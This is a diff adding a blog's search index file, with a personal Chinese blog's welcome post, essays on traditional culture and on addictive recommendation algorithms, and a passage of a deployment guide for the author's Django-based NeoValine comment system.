@@ -1,0 +1,896 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search>
+  <entry>
+    <title>Hi there！欢迎访问我的网站 🚀</title>
+    <url>/archives/0/</url>
+    <content><![CDATA[<img src="/archives/0/cover.jpg" class="" title="网站封面">
+<p>这里是 Oh-My-Sites 🍁 霞之彼端，我的个人站点 😃。我是善国峻，一名学生 👨‍🎓，同时也是一个向往极客精神 🤓、喜欢思考 🤔 和写作 ✍️ 的业余开发者 👨‍💻。</p>
+<p>我曾经学习了一年的物理，之后学习了三年计算机和信息安全相关的内容，慢慢对互联网世界有了更深更广的认识。后端、前端、数据分析……我仍然在不停地学习，希望有朝一日也能为这个世界做一些可能微小但有用的工作。</p>
+<p>Meanwhile, I am a believer in open source. 我正打算利用空闲时间开发一款开源的、有后台审核功能的、可本地化部署的嵌入式评论系统。事实上，相关工作已经取得了一些进展，初代版本已经在该网站和我的服务器上稳定可靠地运行了 6 个月，但出于某些原因被我暂时关闭了本站的评论功能。你可以戳<a href="https://www.ohmysites.com/archives/15/">这里</a>了解更多信息甚至尝试部署测试版本。如果你对前端尤其是 NodeJS、WebPack 相关内容有一定了解，同时对该项目感兴趣，欢迎积极联系我 😉</p>
+<p>本网站的内容并不限于互联网技术有关的内容，关于我和本站的更多信息，欢迎访问本站的<a href="/about/">关于</a>页面来进一步了解。</p>
+<p>👇 以下是我近期的一下文章 😄</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>当我们在说传统文化的时候，我们到底在说什么</title>
+    <url>/archives/20/</url>
+    <content><![CDATA[<p>这是我前段时间刷到的一个视频，是日本早稻田大学东京花火舞蹈团的表演：</p>
+<div><iframe style="position: absolute; width: 100%; height: 100%; left: 0; top: 0;" src="https://player.bilibili.com/player.html?cid=131761570&aid=77033779&page=2&as_wide=1&high_quality=1&danmaku=1" scrolling="no" frameborder="no" framespacing="0" allowfullscreen="true"></iframe></div>
+<p>这个视频我刷了好几遍，连我这个对舞蹈一窍不通的人都从视频里感受到他们的活力（嗯绝对不是因为第一排的短发小姐姐太飒了）但是看的时候，有那么几行弹幕引起了我的注意：</p>
+<blockquote class="blockquote-center">
+<p>真的是好羡慕好喜欢日本的传统文化</p>
+
+</blockquote>
+<p>嗯？传统文化？当我们在说传统文化的时候，我们到底在说什么？</p>
+<a id="more"></a>
+<h2 id="现代文化产品"><a class="markdownIt-Anchor" href="#现代文化产品"></a> 现代文化产品</h2>
+<p>我原本想研究一下这个舞蹈团的历史，奈何不管是内网还是外网上的信息都少的可怜。那我就仅根据视频里的内容简单分析一下吧。</p>
+<p>网上能找到的这个舞蹈团的视频最早也只能到 2017 年，再加上这个舞蹈团相关的信息很少，所以我推断这应该是一个很年轻的舞蹈团。这种表演形式据评论区说是叫“夜来舞”，源自日本高知县夜来节（Yosakoi），是一种祭祀舞蹈。根据维基百科，高知县从 1954 年开始举办夜来节，来源请戳<a href="https://zh.wikipedia.org/wiki/YOSAKOI">这里</a>。所以可以推断，夜来舞出现的时间最长也不会超过 66 年，依旧是一种很年轻的活动。视频里的服饰风格和一开始的音乐风格也符合日本大正时期（1912~1926）的特征。综合来看，这种艺术形式确实还很年轻。</p>
+<p>另一个吸引我的点是，这次表演的 BGM 里出现了很多元素。从大正浪漫风格，到日本艺妓风格，到西洋舞曲风格，再到热血的动漫风格，这么多风格穿插在一起我却并没有感觉违和，反而是越看越激动哈哈哈~</p>
+<p>说了这么多，我只是想说明一点，那就是夜来舞只是一种<strong>现代文化产品</strong>，和所谓传统文化也只是有一些继承的关系，和其他一些现代文化产品，比如迪士尼文化，美国西部牛仔文化，汉堡文化，漫威文化，李子柒风格的中式田园文化，还有最近比较火的造星文化，螺蛳粉文化，盲盒文化等等，其本质是一样的，都是人类完成工业化后才被制造出来的文化产品。</p>
+<h2 id="文化符号"><a class="markdownIt-Anchor" href="#文化符号"></a> 文化符号</h2>
+<p>但是为什么会有这么多人将一种现代文化产品误认为是传统文化呢？因为这些现代文化产品确实从传统文化中发掘了一些文化符号。在这个视频里，日语、日式服饰、日式唱腔，都是日本的文化符号。</p>
+<p>文化符号是现代文化产品里不可缺少的一件东西。文化本身是一种很难传播的东西，现代文化产品为了便于传播，一般会从文化中找出一些有特色的具象化的东西，并通过暗示将文化的内涵和文化符号绑定，比如麻将代表中国，和服代表日本，都是在全世界范围内十分成功的文化符号。</p>
+<p>但是文化往往只能通过文化符号来快速传播，而文化符号的产生过程就注定了文化符号不可能将文化的全部内涵都表达出来。当“汉服爱好者”们还在纠结“是不是山”的问题时，世界上的绝大多数人，甚至包括很多中国人和日本人，都还是会把汉服误认为是和服。</p>
+<h2 id="传统文化只是现代文化产品的原材料"><a class="markdownIt-Anchor" href="#传统文化只是现代文化产品的原材料"></a> 传统文化只是现代文化产品的原材料</h2>
+<p>在我搜集资料的时候发现其他夜来舞相关的视频在各大视频平台并不少，但是播放量都几乎没有。大家同样都是所谓“传统文化”，但是为什么有的文化受人追捧，有的却无人问津呢？同样都是所谓“传统文化”，爆款和冷门的区别是什么？</p>
+<p>很多人对美国文化嗤之以鼻，觉得这个只有两百年历史的年轻国家没有资格提“文化”两个字。然而事实却是，美国是全球最具文化影响力的国家。美国并没有所谓的传统文化，美国人甚至欣赏不了欧洲古典文化，但是却有全世界最强大的现代文化产品产业，这在很多人眼中都是矛盾的，觉得美国文化都是资本推动下产生的垃圾文化。</p>
+<p>这些人不知道的是，传统文化只是现代文化产品的原材料，这种传统文化不一定只能是本国的文化，可以是人类共同的文化，比如爱国、友善、正义、公平、自由等人类共同追求的东西，也可以是借用其他国家的文化，比如迪士尼的动画版花木兰。</p>
+<p>在制造现代文化产品的时候，一般会在传统文化中取材，但是往往很难将传统文化的各个方面都继承过来，原因之一前文也提到了，文化符号注定是片面的，从某个方面说就是一种“刻板印象”。</p>
+<p>另一个原因是，绝大部分传统文化其实很难满足现代人的需求，换句话说就是落伍了。工业时代的人需要的是工业时代的文化。宫斗剧是传统文化吗？不全是，宫斗剧只是借用了宫廷的壳，其表现的内核依旧是现代职场文化，这也就是为什么宫斗剧的最大受众是一二线城市的白领们。</p>
+<p>还有一个我认为很典型的例子是，黑人抬棺：</p>
+<div><iframe style="position: absolute; width: 100%; height: 100%; left: 0; top: 0;" src="https://player.bilibili.com/player.html?cid=172423516&aid=370010949&page=1&as_wide=1&high_quality=1&danmaku=1" scrolling="no" frameborder="no" framespacing="0" allowfullscreen="true"></iframe></div>
+<p>其实早在黑人抬棺在 B 站大火之前，我就已经知道加纳地区有抬棺的习俗，但是我是通过一个社会新闻了解到这个习俗的，大概的新闻内容是某次抬棺时一不小心把死者摔出来了。当时我看到这个新闻的时候并没有觉得黑人抬棺这种习俗有什么大火的潜力。</p>
+<p>但是谁能想到，千里之外的中国，一个视频 UP 主，通过剪辑和电子音乐，成功制造了 B 站网友的又一次文化盛宴。由此可见，不可能只继承所谓传统文化就能制造出深入人心的文化产品。汉服和中医等一些中国传统文化，如果只强调继承而故意忽视创新，也很难适应现代人的文化需求。</p>
+<h2 id="文化产品实力的背后是工业实力"><a class="markdownIt-Anchor" href="#文化产品实力的背后是工业实力"></a> 文化产品实力的背后，是工业实力</h2>
+<p>前文提到过，美国是全球最具文化影响力的国家。为什么恰恰是美国，而不是中国、印度或者是非洲？</p>
+<p>前文提到，东京花火舞蹈视频是以日本大正时期作为起点的，也就是 1912 年至 1926 年 ，这恰好是日本<strong>完成工业化</strong>的时间。</p>
+<p>韩国和台湾也比中国更早完成工业化，所以在我这个 95 后的记忆中，曾有很长一段时期，日本韩国台湾香港的文化产品在中国大陆市场占有绝对的优势地位。但是近几年，随着中国经济的强劲发展，在不少文化领域，中国大陆已经反过来向台湾香港等地区输出文化产品，Youtube 上有不少这些地区的节目都以中国文化（尤其是中国大陆近年的综艺节目、电视剧、梗）做了很多节目。在了解到这个之前，我很难想象，爱奇艺已经成为了台湾人民最常使用的 App 之一，他们也在和大陆人民一起热烈讨论《青春有你 2》中的热点事件。</p>
+<p>前几年一直有人抱怨，香港电影行业在回归以后一直在有下坡路。其实香港由于其特殊的产业结构，早在上世纪 90 年代经济已经出现疲态，电影行业在 90 年代时也完全不如之前的几十年风光。</p>
+<p>为什么工业化之后文化实力也会相应地产生一个质的飞跃呢？</p>
+<p>在农业社会，男女老少只要有劳动能力，都会下地劳作，没有处处通电所以晚上能干的事情极少，人们没有消费能力，也没有足够的时间来消费文化产品。而工业化的出现，让一部分人有了稳定的工作，电子产品的制造和发电能力的提升也极大地丰富了人们可选择的娱乐产品，文娱市场开始出现。有了相对自由的文娱市场，就会有文娱公司创造更吸引人的文化产品来相互竞争，当国内市场趋于饱和的时候，就会向国外相对落后的市场输出充分竞争过的、已经在国内市场获得成功的文娱产品，而这种输出往往会碾压当地落后的文化产品。这就是文化输出。</p>
+<p>说到这里也就不难理解，为什么美国会成为全球最具文化影响力的国家。</p>
+<h2 id="后记"><a class="markdownIt-Anchor" href="#后记"></a> 后记</h2>
+<p>当我们在说传统文化的时候，我们到底在说什么？当我们在羡慕其他国家传统文化的时候，我们到底在羡慕什么？我的答案很明显：经济。很多我们以为的传统文化，似乎都没那么传统，都是工业化以后才被制造出来的文化产品。</p>
+<p>考研的时候背过这么一句话：“道路自信、理论自信、制度自信，归根结底是文化自信。”其实我个人认为这句话稍微有点偏差，道路自信、理论自信、制度自信、文化自信，四个自信的背后应该是对我国的经济发展的自信。如果经济不行，没有人会研究你的道路理论和制度；相反，如果经济欣欣向荣，其他人就会不自觉地来学习你的道路理论和制度。</p>
+<p>在我看来，中国太过强调对传统文化的继承，而相对不太强调文化创新，但是文化创新的重要性其实并不弱于对传统文化的继承。当然这只是站在发展国家文化产业的角度上来说的。</p>
+<p>当然也有人会反对，说中国已经是世界最大的工业国，每年产十亿吨钢铁，是全球第二的印度的将近十倍，为什么我国的文化软实力还如此孱弱。</p>
+<p>其实一方面，我国在某些方面的文化实力已经是世界领先水平，比如网文小说。事实上，网文小说在海外的发展远远超过了大部分人的预期，根据 2020 年首届上海国际网络文学周发布的白皮书里透漏的数据：目前，从网络文学出海整体规模来看，截至 2019 年国内向海外输出网络文学作品 10000 余部，覆盖 40 多个“一带一路”沿线国家和地区。仅 2019 年翻译网络文学作品就高达3000余部……你很难想象有一大群外国人，无偿翻译搬运国内的网文小说，每天靠看这些国内认为低俗的网文度日。</p>
+<p>另一方面，中国改革开放刚刚走过了 40 年，文化市场又经历了国外的轮番轰炸，需要一定的时间和空间来孕育。如果我们对国家经济未来的发展充满期待，那就应该对我国的文化产业抱有同样水平的期待。让子弹飞一会儿吧。</p>
+]]></content>
+      <categories>
+        <category>随笔</category>
+      </categories>
+      <tags>
+        <tag>文化</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>黄、赌、毒，以及被滥用的推荐算法</title>
+    <url>/archives/19/</url>
+    <content><![CDATA[<p>在高二的一个夜晚，我无意中刷当时网易新闻 App 新推出的短视频功能（大概 2015 年，当时还没有抖音）刷到了凌晨 4 点，在我头痛欲裂的同时，我开始意识到一件事，互联网行业出现了一种颠覆性的新的玩法，并且我很明确地不喜欢这个新的事物。自那以后，我和自己明确了一个原则，那就是永不使用有刷不完的推荐信息流（包括但不限于视频）的手机 App。站在 2021 年的今天，我依旧艰难的坚持着这个原则。之所以坚持的这么艰难，最主要的原因就是，我很难找出一款没有无限推荐信息流的大众 App。几年的时间里，从网易云音乐，到 B 站，再到淘宝京东……而就在 2020 年年末，知乎将产品逻辑从订阅转换为推荐的时候，我忍痛卸载了手机上的知乎 App。渐渐地，我的手机基本上回到了它原本的名字：移动电话。</p>
+<p>就在我写这篇文章的时候，何同学发了一个视频：</p>
+<div><iframe style="position: absolute; width: 100%; height: 100%; left: 0; top: 0;" src="https://player.bilibili.com/player.html?cid=277835841&aid=246051041&page=1&as_wide=1&high_quality=1&danmaku=1" frameborder="no" scrolling="no" framespacing="0" allowfullscreen="true"></iframe></div>
+<p>其中有一个和我这篇文章很像的观点，那就是互联网公司在尽全力榨取用户的时间：</p>
+<blockquote class="blockquote-center">
+<p>手机并不好玩，不少人在手机上投入大量时间其实是借助手机来缓解焦虑</p>
+
+</blockquote>
+<p>这也是这篇文章的观点之一。而这篇文章还有另一个观点，那就是在我心里，黄、赌、毒，以及被滥用的推荐算法，其实是四个并列的概念。</p>
+<p>在我看来，从某个角度上来说，世界上只有三种人，一种是刷手机来缓解焦虑的人，一种是沉迷手机世界而对现实无感的人，最后一种是没有手机依赖症的人。</p>
+<a id="more"></a>
+<div class="note primary"><p>推荐算法作为一种新生事物，自然有好的一面也有不好的一面，这篇文章<strong>只讨论被滥用的推荐算法</strong>，即互联网公司为了利益，利用人性的弱点，让用户在没有主动获取信息的时候被动接受来自推荐算法的信息，或者利用刷不完的推荐信息流等形式恶意抢占用户时间。本文中所说的推荐算法，除了特别说明的，都是指被滥用的推荐算法。</p>
+</div>
+<h2 id="手机是最易获得的减压玩具"><a class="markdownIt-Anchor" href="#手机是最易获得的减压玩具"></a> 手机是最易获得的减压玩具</h2>
+<p>绝大多数一不小心刷了几个小时手机之后又疯狂后悔的人，其实是把手机当成了减压玩具；并且这些人也很明白，刷完手机压力会更大。</p>
+<p>虽然我很多时候都能比其他人提前完成任务，但是事实上我依然是一个拖延症晚期患者。我的经验可能不能覆盖所有拖延症患者，但是我自己很清醒，对于我的这种拖延症，最大的诱因就是焦虑的情绪。</p>
+<blockquote class="blockquote-center">
+<p>焦虑，源于对未来某个事件的不确定结果的担心和恐惧。</p>
+
+</blockquote>
+<p>对于我个人而言，最典型的焦虑场景就是考试，尤其是升学考试。</p>
+<p>人是一种很奇怪的动物，在面对焦虑的时候会本能地做出一些行为，而这些行为往往对于缓解焦虑或者获得一个更好的结果毫无作用。比较典型的行为包括：啃指甲、咬嘴唇、玩各种可以玩的小东西（比如衣角，辫子），以及最致命的，逃避。</p>
+<p>假如我对一些无足轻重的事情产生了焦虑情绪，那我经常会直接选择最坏的结果，这样就能以最快速度彻底释放焦虑的情绪。然而遗憾的是，生活中遇到的大部分能产生焦虑的事情都很重要，比如升学、Deadline，或者面对自己喜欢的人。</p>
+<p>但是哪怕是遇到了这些重要的事情，人也会不自觉地选择逃避。面对自己喜欢的人会逃避，Deadline 的前一个星期会逃避（即拖延），升学备考的过程中也会逃避，比如拿出手机……</p>
+<p>毫无疑问的一点是，手机（里安装的 App），作为绝大部分人手边最容易拿到的一件东西，成为了最易获得的减压玩具。那么问题就来了，是谁设计了这些减压玩具呢？</p>
+<img src="/archives/19/19_1.jpg" class="" title="老虎机">
+<p>这是老虎机，由于中国法律的限制，绝大多数中国人应该只在港片里见过这种赌博机器。投币之后老虎机上会随机出现三种图案，而假如三个图案一样，老虎机就会成倍地吐出硬币。如此简单的一种机器却让全世界的人为之疯狂，其背后的成瘾原理也很简单：<strong>人类会对揭晓未知结果的这个过程产生快感</strong>（多巴胺）。</p>
+<p>人会在枯燥的信息流上耗费一整个美好夜晚的原因也是如此：你永远不知道下一个刷到的东西会是什么。</p>
+<p>但是这里有一个问题，老虎机出现相同图案的概率不算很低，但是随机的视频或者图片很难让一个普通人获得足够的快感，一般人在刷个几分钟之后便会自觉停止。这个时候，推荐算法的出现，让信息流完成了由精选信息到老虎机的究极进化。</p>
+<p>心理学上有一个经典的实验，让一个人喝一碗汤，而这碗汤会很慢地不被察觉地加汤，结果就是喝汤的人会喝到很撑才会停下，并且开始意识到事情不对劲。很明显，互联网人学习过这个实验，并且学的很好。某些互联网平台为了赚钱，甚至从心理学里汲取灵感，将各种各样的老虎机精心包装成 App 的样子，实在是令人恶心的行为。</p>
+<h2 id="贩毒开赌场的互联网企业"><a class="markdownIt-Anchor" href="#贩毒开赌场的互联网企业"></a> “贩毒开赌场”的互联网企业</h2>
+<p>如果说到黄赌毒的共同特征，绝大部分人都会想到这三样东西对于个人、家庭、国家都会带来巨大的危害，这一点推荐算法也不例外。对于个人，沉迷手机影响工作效率；对于家庭，家长们都把孩子放在一边然后自己玩手机，等孩子长大一点就直接给一部手机让孩子自己玩……</p>
+<p>但是这四者还有一个共同特征，那就是从某种程度上来说，这四者发展到一定程度，很大程度都是上瘾了。上瘾的原因也是一样的，那就是太爽了。</p>
+<p>当一个人体会过嫖妓的“爽”之后，便会对现实中艰难的求偶过程失去兴趣，或者是和另一半 ML 时因为需要保证对方“有爽到”而心累；当一个人体会过一分钟几十上百万的财富暴涨之后，便会对现实中辛辛苦苦一个月几千块的工资失去兴趣；吸毒就更不必说了，就连富二代和明星这样的现充也会沉迷于吸毒。</p>
+<p>在《天亮之前》里，郭富城扮演的赌徒的一句台词令我印象深刻：</p>
+<blockquote class="blockquote-center">
+<p>赌博有三重境界，不怕输，输不怕，怕不输。</p>
+
+</blockquote>
+<p>赌博真正到了第三重境界以后，其实享受的并不是赚钱，而是财富迅速变化所产生的那种快感。为什么嫖娼只有零次和无数次？为什么很多吸毒人员在解毒之后还会复吸？为什么赌徒明知道自己一定会输，但还是收不回下注的手？都是多巴胺在作祟。</p>
+<p>网游会上瘾，手机游戏会上瘾，甚至刷短视频都会上瘾，都是相似的原理。但可怕的是，黄赌毒是法律明令禁止的行为，国家对于各种游戏也有相应的政策和监管措施，而推荐算法仍然是随处可摘的“大麻”。</p>
+<h2 id="推荐算法所带来的影响"><a class="markdownIt-Anchor" href="#推荐算法所带来的影响"></a> 推荐算法所带来的影响</h2>
+<p>推荐算法所带来的影响有很多，信息茧房等等内容我在<a href="https://www.ohmysites.com/archives/1/#%E6%95%B0%E6%8D%AE%E5%AD%A4%E5%B2%9B%E7%88%86%E5%8F%91%E9%95%BF%E5%B0%BE%E6%95%88%E5%BA%94%E5%A4%B1%E6%95%88">这篇文章</a>里已经大概聊过，这里我再简单聊聊推荐算法对广告投放和内容平台的垄断两个方面的影响。</p>
+<p>从商业上来讲，推荐算法可以说是商业上的一次颠覆性的进步。著名“营销先驱” John Wanamaker 曾经提出广告界的哥特巴赫猜想：</p>
+<blockquote class="blockquote-center">
+<p>我在广告上的投资有一半是无用的，但问题是我不知道是哪一半。</p>
+
+</blockquote>
+<p>推荐算法的出现很完美地解决了广告界的这一难题。由于推荐算法都是基于大数据分析，广告投放平台可以很容易地知道自己投放的广告被多少人观看，其中有多少男性，有多少学生，有多少孕期母亲。广告投放平台也能很容易地控制广告的投放，防脱发广告和增高广告只投放给男性，卖课广告只投放给学生，孕妇产品广告只投放给孕期母亲，从而提高广告的转化率。</p>
+<p>互联网平台的垄断地位，尤其是主打内容的互联网平台的垄断地位，推荐算法功不可没。平台可以通过推荐算法，让用户看到平台想让用户看到的内容，而不是用户真正想看到的内容，甚至以此来限制内容创作者。不少互联网内容平台正向着最糟糕的方向急速狂奔，背离了互联网诞生之初的愿望。</p>
+<h2 id="推荐算法原本应该发挥的作用"><a class="markdownIt-Anchor" href="#推荐算法原本应该发挥的作用"></a> 推荐算法原本应该发挥的作用</h2>
+<p>在我的想象中，推荐算法的正确打开方式，应该是在我<strong>主动</strong>搜索某个信息的时候，系统能快速推荐给我<strong>最想要</strong>的那个信息。在我看来，所有被动推荐的信息都是不必要的，甚至会加剧信息茧房的形成。人在被动接受信息的时候还是随机一点好，不然很容易对这个世界产生错误的认知和理解。</p>
+<h2 id="后记"><a class="markdownIt-Anchor" href="#后记"></a> 后记</h2>
+<p>因为数字经济成为了中国新的经济增长引擎，所以在去年以前政府对于互联网的行为更多的是在摸索合适的监管力度。最近一两年，随着整个社会对于推荐算法的关注，国家对于推荐算法的监管也会逐步完善。但是我觉得这个过程太慢了。我希望能有一部分渴望自律的人，能首先站出来，勇敢地向推荐算法说不，并用行动抵制那些“贩毒开赌场”的互联网企业。</p>
+]]></content>
+      <categories>
+        <category>随笔</category>
+      </categories>
+      <tags>
+        <tag>互联网</tag>
+        <tag>推荐算法</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>NeoValine：一个基于 Valine 开发的支持人工审核的评论系统</title>
+    <url>/archives/15/</url>
+    <content><![CDATA[<p>终于，我的评论系统开发成功了 🎉🎉🎉 我将其命名为 NeoValine 🥳</p>
+<p>项目链接：</p>
+<ul>
+<li><a href="https://github.com/UdUklm/NeoValine">GitHub-前端源码</a></li>
+<li><a href="https://github.com/UdUklm/NeoValineBackend">GitHub-后端源码</a></li>
+</ul>
+<h2 id="简介"><a class="markdownIt-Anchor" href="#简介"></a> 简介</h2>
+<p>NeoValine 是一款基于 <a href="https://valine.js.org/">Valine</a> 开发的，有后端和控制面板的，支持人工审核（先审核后显示）的快速、简洁且高效的评论系统。</p>
+<div class="note primary"><h3 id="特点"><a class="markdownIt-Anchor" href="#特点"></a> 特点</h3>
+<ul>
+<li>本地化部署</li>
+<li>管理员控制面板</li>
+<li>先审核后显示的审核方法</li>
+<li>免费开源无广告（GPL-2.0 License）</li>
+<li>前端基于 Valine 开发，快速、简洁、高效</li>
+</ul>
+</div>
+<h3 id="未来打算支持"><a class="markdownIt-Anchor" href="#未来打算支持"></a> 未来打算支持</h3>
+<ul>
+<li>使用 Docker 来简化部署</li>
+<li>简单的文章访客统计和网站访客统计</li>
+<li>更高程度的用户自定义</li>
+<li>移除或改进可能造成隐私泄露的功能</li>
+</ul>
+<a id="more"></a>
+<h2 id="开发-neovaline-的理由"><a class="markdownIt-Anchor" href="#开发-neovaline-的理由"></a> 开发 NeoValine 的理由</h2>
+<p>评论系统是博客中很重要的一部分，是网站与访问者沟通交流的重要渠道。有不少开发者都为博客系统开发了好用的评论系统，比如 <a href="https://valine.js.org/">Valine</a>。这些评论系统可以在无服务器的情况下部署使用。</p>
+<p>但是我的网站是在中国大陆注册的，进行了 ICP 备案和公网备案。而根据公网备案的相关要求，我的网站上的评论系统必须具有<mark>先审核后显示</mark>的功能。</p>
+<p>但是我找遍了全网的评论系统，全都难以符合我的要求，所以我决定自己开发一套有先审核后显示功能的评论系统。</p>
+<p>为什么我说全网的评论系统都难以符合我的要求呢？</p>
+<p>首先一个问题就是这些评论系统的数据都存储在他们的服务器上。假如哪天这些厂商倒闭了或者开发者弃坑了，数据转移是一个很大的问题。</p>
+<h3 id="valine"><a class="markdownIt-Anchor" href="#valine"></a> Valine</h3>
+<p>基于 <a href="https://www.leancloud.cn/">LeanCloud</a> 的 Server-less 评论系统，界面很漂亮。</p>
+<p>官网链接：<a href="https://valine.js.org/">Valine</a></p>
+<p>其实在 LeanCloud 上部署 <a href="https://github.com/DesertsP/Valine-Admin">Valine-Admin</a> 是可以有人工审核的功能的，但是由于 LeanCloud 的应用无法 24h 提供服务，每天强制停止服务 6 小时（可以正常评论，但是部署的应用无法正常工作），这就导致了在上面部署的应用在某部分时间段里是失效的。</p>
+<p>假如每天只在 7:00~23:59 之间服务，则会导致以下问题：</p>
+<ul>
+<li>该时间段内的评论会直接通过审核，这应该是一个漏洞。</li>
+<li>该时间段内的评论不会及时提醒。</li>
+</ul>
+<p>除此之外，Valine-Admin 的评论管理界面对移动端的适配也有点问题。</p>
+<h3 id="畅言"><a class="markdownIt-Anchor" href="#畅言"></a> 畅言</h3>
+<p>有人工审核的功能，但是界面过时，且免费版有广告。</p>
+<h3 id="github-系列"><a class="markdownIt-Anchor" href="#github-系列"></a> GitHub 系列</h3>
+<p>包括 gitment，gitalk 和 gitter。</p>
+<p>没有人工审核应该是唯一的缺点。</p>
+<h3 id="disqus-系列"><a class="markdownIt-Anchor" href="#disqus-系列"></a> Disqus 系列</h3>
+<p>使用 Facebook、Tweeter 登录评论不符合国情，没有人工审核的功能，且被墙的可能性很大。</p>
+<h3 id="boomneovaline"><a class="markdownIt-Anchor" href="#boomneovaline"></a> Boom！NeoValine！</h3>
+<p>Serverless 是近几年前端技术的趋势之一，也是 Valine 坚持的理念之一。但是我仍然坚持自己开发后端程序。</p>
+<p>首先是因为费用问题，一些 Serverless 的服务，比如 LeanCloud，无法支持全天 24 小时提供服务，每天必须强制休眠一段时间。</p>
+<p>其次是因为没有美观舒服的后台系统。因为经常要进入后台审核评论，后台的功能性（比如对数据的简单筛选）和美观性很难保证。想要实现的话很大程度上还要自己开发应用并在 LeanCloud 部署。</p>
+<p>再者，评论数据的后期迁移也是一件不简单的事情。这主要是考虑 LeanCloud 某天可能会停止服务的情况。</p>
+<p>最后，我的网站是部署在服务器上的，顺便还可以积累一下从开发到部署的经验。</p>
+<h2 id="后端部署方法"><a class="markdownIt-Anchor" href="#后端部署方法"></a> 后端部署方法</h2>
+<p>实例环境：<code>CentOS 7.8.2003</code></p>
+<p>这里给出的安装策略是：使用 uwsgi 在 localhost 运行 Django 后端程序，使用 Systemd 守护进程，使用 Nginx 反向代理 API 接口。</p>
+<p>如果你青睐于使用跨域，感谢 <a href="https://github.com/OuYanghaoyue">OuYanghaoyue</a> 的贡献，NeoValine 现已支持跨域部署。</p>
+<h3 id="requirements"><a class="markdownIt-Anchor" href="#requirements"></a> Requirements</h3>
+<ul>
+<li><code>Python &gt;= 3.7</code></li>
+<li><code>pip</code></li>
+<li><code>uwsgi</code></li>
+<li><code>sqlite3</code></li>
+<li><code>nginx</code></li>
+<li><code>systemd</code></li>
+</ul>
+<p>比较老的 Linux 版本可能不支持 <code>Python3.7</code>，需要自己编译安装。这些环境的安装教程网上已有大把文章，这里不再赘述。</p>
+<h3 id="部署-django-程序"><a class="markdownIt-Anchor" href="#部署-django-程序"></a> 部署 Django 程序</h3>
+<p>首先在服务器上获得项目代码：</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">git clone https:&#x2F;&#x2F;github.com&#x2F;UdUklm&#x2F;NeoValineBackend --depth 1</code></pre>
+<p>编辑 <code>NeoValineBackend/NeoValineBackend/hidden_options.py</code>，并按照提示填写参数：</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">cd  NeoValineBackend&#x2F;NeoValineBackend&#x2F;
+mv hidden_options.py.example hidden_options.py
+vim hidden_options.py</code></pre>
+<p>返回项目根目录。</p>
+<p>在项目根目录生成数据库：</p>
+<pre class="language-none"><code class="language-none">sqlite3 db.sqlite3</code></pre>
+<p>安装 Virtualenv 并创建虚拟环境，安装依赖：</p>
+<pre class="language-none"><code class="language-none">pip install virtualenv
+virtualenv venv
+source venv&#x2F;bin&#x2F;activate
+pip install -r requirements.txt</code></pre>
+<p>生成数据库表：</p>
+<pre class="language-none"><code class="language-none">python manage.py makemigrations user
+python manage.py makemigrations comment
+python manage.py makemigrations
+python manage.py migrate user
+python manage.py migrate comment
+python manage.py migrate</code></pre>
+<p>生成超级管理员，并填写信息：</p>
+<pre class="language-none"><code class="language-none">python manage.py createsuperuser</code></pre>
+<p>生成静态文件夹：</p>
+<pre class="language-none"><code class="language-none">python manage.py collectstatic</code></pre>
+<p>到这里程序已经准备完成，如果想检测是否出错，可以将 <code>https://github.com/UdUklm/NeoValineBackend/blob/master/NeoValineBackend/settings.py</code> 中的 <code>DEBUG</code> 置为 <code>True</code>，之后运行 <code>python manage.py runserver</code> 查看效果。<strong>注意</strong>之后勿忘将 <code>DEBUG</code> 置回 <code>False</code>。</p>
+<h3 id="使用-uwsgi-部署-django-程序"><a class="markdownIt-Anchor" href="#使用-uwsgi-部署-django-程序"></a> 使用 uwsgi 部署 Django 程序</h3>
+<p>生成一个 <code>uwsgi.ini</code> 文件，按照下列提示填入：</p>
+<pre class="language-none"><code class="language-none">[uwsgi]
+pid &#x3D; run_user
+chdir &#x3D; path_to_NeoValineBackend
+master &#x3D; true
+processes &#x3D; 1
+threads &#x3D; 2
+http &#x3D; 127.0.0.1:8080
+static-map &#x3D; &#x2F;static&#x3D;path_to_static_folder
+vacuum &#x3D; true
+home &#x3D; path_to_venv
+wsgi-file &#x3D; path_to_&#x2F;NeoValineBackend&#x2F;NeoValineBackend&#x2F;wsgi.py
+logto &#x3D; log_location_you_want</code></pre>
+<p>记住该文件的位置</p>
+<h3 id="使用-systemd-守护进程"><a class="markdownIt-Anchor" href="#使用-systemd-守护进程"></a> 使用 Systemd 守护进程</h3>
+<pre class="language-bash" data-language="bash"><code class="language-bash">cd &#x2F;etc&#x2F;systemd&#x2F;system
+touch neovaline.servise</code></pre>
+<p>编辑 <code>neovaline.servise</code>:</p>
+<pre class="language-none"><code class="language-none">[Unit]
+Description&#x3D;NeoValine Backend Service
+After&#x3D;syslog.target
+
+[Service]
+KillSignal&#x3D;SIGQUIT
+ExecStart&#x3D;&#x2F;usr&#x2F;local&#x2F;python3&#x2F;bin&#x2F;uwsgi --ini path_to_uwsgi.ini
+Restart&#x3D;always
+Type&#x3D;notify
+NotifyAccess&#x3D;all
+StandardError&#x3D;syslog
+
+[Install]
+WantedBy&#x3D;multi-user.target</code></pre>
+<p>相关命令：</p>
+<pre class="language-none"><code class="language-none">systemctl start neovaline  # 开启服务
+systemctl enable neovaline  # 开机自启
+systemctl stop neovaline  # 关闭服务</code></pre>
+<p>开启后可以使用 <code>netstat -ntlp</code> 检测本地 <code>8080</code> 端口运行情况。</p>
+<h3 id="使用-nginx-反向代理"><a class="markdownIt-Anchor" href="#使用-nginx-反向代理"></a> 使用 Nginx 反向代理</h3>
+<p>在网站的 Nginx 配置文件中加入：</p>
+<pre class="language-none"><code class="language-none">location &#x2F;api&#x2F; &#123;
+    proxy_pass http:&#x2F;&#x2F;127.0.0.1:8080;
+    access_log log_location_you_want;
+&#125;</code></pre>
+<p>即将所有以 <code>/api/</code> 开头的请求转发到 <code>127.0.0.1:8080</code>。</p>
+<h2 id="前端使用方法"><a class="markdownIt-Anchor" href="#前端使用方法"></a> 前端使用方法</h2>
+<p>前端的部署参考 <a href="https://valine.js.org/configuration.html">Valine</a> 的部署方法。</p>
+<p>但是有些参数不支持，比如 <code>appId</code> 和 <code>appKey</code>，示例配置如下：</p>
+<pre class="language-js" data-language="js"><code class="language-js">&lt;script&gt;
+new Valine(&#123;
+  el         : &#39;#valine-comments&#39;,
